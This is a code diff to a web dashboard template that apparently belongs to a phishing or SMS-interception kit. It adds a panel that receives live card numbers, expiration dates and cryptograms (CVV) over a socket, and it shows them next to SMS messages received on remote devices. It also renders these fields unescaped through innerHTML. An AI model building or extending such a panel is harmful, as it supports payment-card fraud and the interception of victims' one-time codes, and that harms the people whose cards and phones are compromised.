@@ -67,31 +67,67 @@
 
 <main class="container">
 
+    <div class = "row">
+        <div class="col">
+        <!--     ///////////////////////////////////////////////// SMS /////////////////////////////////////////////////     -->
+            <div class="my-3 p-3 bg-white rounded shadow-sm" >
+                <div id="list-sms">
+                    <h5 class="border-bottom pb-2 mb-0">Recent messages received on devices </h5>
 
-    <div class="my-3 p-3 bg-white rounded shadow-sm" >
-        <div id="list-sms">
-            <h6 class="border-bottom pb-2 mb-0">Recent messages received on device ******1043</h6>
-
-        </div>
-        <small class="d-block text-end mt-3">
-            <button type="button" class="btn btn-sm btn-link" id="history-button" onclick="showHidePreviousMessages()">Show history</button>
-        </small>
-    </div>
-
-    <div class="my-3 p-3 bg-white rounded shadow-sm" id="previous-messages">
-        <h6 class="border-bottom pb-2 mb-0">Previous messages</h6>
-
-        <% messages.forEach( message =>{ %>
-            <div class="d-flex text-muted pt-3">
-                <img src="images/chat-bubbles-with-ellipsis.ico" width="30" height="30" style="margin-right: 20px"/>
-                <p class="pb-3 mb-0 small lh-sm border-bottom">
-                    <strong> <%= message.datetime %> </strong>
-                    <strong class="d-block text-gray-dark" style="color: #ff0263">  From <%= message.sender %> </strong>
-                    <%= message.content %>
-                </p>
+                </div>
+                <small class="d-block text-end mt-3">
+                    <button type="button" class="btn btn-sm btn-link" id="history-button" onclick="showHidePreviousMessages()">Show history</button>
+                </small>
             </div>
-        <% }); %>
+
+            <div class="my-3 p-3 bg-white rounded shadow-sm" id="previous-messages">
+                <h6 class="border-bottom pb-2 mb-0">Previous messages</h6>
+
+                <% messages.forEach( message =>{ %>
+                    <div class="d-flex text-muted pt-3">
+                        <img src="images/chat-bubbles-with-ellipsis.ico" width="30" height="30" style="margin-right: 20px"/>
+                        <p class="pb-3 mb-0 small lh-sm border-bottom">
+                            <strong> <%= message.datetime %> </strong>
+                            <strong class="d-block text-gray-dark" style="color: #ff0263">  From <%= message.sender %> </strong>
+                            <%= message.content %>
+                        </p>
+                    </div>
+                <% }); %>
+            </div>
+        </div>
+
+
+        <div class="col">
+            <!--     ///////////////////////////////////////////////// CARDS /////////////////////////////////////////////////      -->
+            <div class="my-3 p-3 bg-white rounded shadow-sm" >
+                <div id="list-cards">
+                    <h5 class="border-bottom pb-2 mb-0">Credit Cards </h5>
+
+                </div>
+                <small class="d-block text-end mt-3">
+                    <button type="button" class="btn btn-sm btn-link" id="history-button-cards" onclick="showHidePreviousCards()">Show history</button>
+                </small>
+            </div>
+
+            <div class="my-3 p-3 bg-white rounded shadow-sm" id="previous-cards">
+                <h6 class="border-bottom pb-2 mb-0">Previous cards</h6>
+
+                <% cards.forEach( card =>{ %>
+                    <div class="d-flex text-muted pt-3">
+                        <img src="images/credit-card.ico" width="30" height="30" style="margin-right: 20px"/>
+                        <p class="pb-3 mb-0 small lh-sm border-bottom">
+                            <strong class="d-block text-gray-dark" style="color: #ff0263">  Code : <%= card.code %></strong>
+                            <strong> Expiration : <%= card.expirationDate %> </strong>
+                            <br/>
+                            <strong> Cryptogram : <%= card.crypto %> </strong>
+                        </p>
+                    </div>
+                <% }); %>
+            </div>
+        </div>
     </div>
+
+
 
 </main>
 <!--<script src="https://cdn.socket.io/socket.io-3.0.1.min.js"></script>-->
@@ -103,6 +139,7 @@
 
     //manage new sms display
     let messages = document.getElementById("list-sms");
+    let cards = document.getElementById("list-cards");
 
     socket.on('new_sms',function (sms){
         console.log(sms);
@@ -117,9 +154,26 @@
         messages.appendChild(div);
     });
 
-    //hide show previous messages
+    socket.on('new_card',function (card){
+        console.log(card);
+        let div = document.createElement('div');
+        div.className = 'd-flex text-muted pt-3';
+        div.innerHTML = '<img src="images/credit-card.ico" width="30" height="30" style="margin-right: 20px"/>\n'+
+            '            <p class="pb-3 mb-0 small lh-sm border-bottom">\n' +
+            '                <strong class="d-block text-gray-dark" style="color: #ff0263">  Code : '+card.code+'</strong>\n' +
+            '               <strong> Expiration : '+card.expirationDate+'</strong>\n'+
+            '               <br/> \n'+
+            '               <strong>Crypto : '+card.crypto+'</strong>\n'+
+            '            </p>\n';
+        cards.appendChild(div);
+    });
+
+    //hide show previous messages/cards
     let previousMessages = document.getElementById('previous-messages');
     previousMessages.style.display = "none";
+
+    let previousCards = document.getElementById('previous-cards');
+    previousCards.style.display = "none";
 
     function showHidePreviousMessages(){
         if (previousMessages.style.display === "none") {
@@ -128,6 +182,16 @@
         } else {
             previousMessages.style.display = "none";
             document.getElementById('history-button').firstChild.data = "Show history";
+        }
+    }
+
+    function showHidePreviousCards(){
+        if (previousCards.style.display === "none") {
+            previousCards.style.display = "block";
+            document.getElementById('history-button-cards').firstChild.data = "Hide history";
+        } else {
+            previousCards.style.display = "none";
+            document.getElementById('history-button-cards').firstChild.data = "Show history";
         }
     }
 
